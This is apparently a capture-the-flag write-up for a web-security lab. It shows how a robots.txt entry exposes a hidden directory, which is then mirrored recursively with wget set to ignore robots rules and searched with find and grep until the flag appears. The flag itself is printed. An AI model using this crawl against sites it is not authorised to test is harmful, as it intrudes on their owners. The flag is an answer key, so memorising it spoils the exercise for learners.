
Visting the robots.txt route give us the follwing output

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

If we visit the /.hidden route we will get a recursive directories containing a file named README

The thing here is to loop through all directories and print all **README** files till we get the flag.

To do that we need to download the whole directory offline using **wget**

```
*[main][/goinfre/mashad/projects/darkly/dd]$ wget -r -np -R "index.html*" -e "robots=off" http://10.12.177.91/.hidden/
*[main][/goinfre/mashad/projects/darkly/dd]$ ls -a 
.       ..      .hidden
*[main][/goinfre/mashad/projects/darkly/dd]$ 
```

Now we will use find command to find all README files and print it's content, it my take a while

```
*[main][/goinfre/mashad/projects/darkly/dd]$ find . -name README  -exec cat {} \;  |grep flag
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
*[main][/goinfre/mashad/projects/darkly/dd]$ 
```
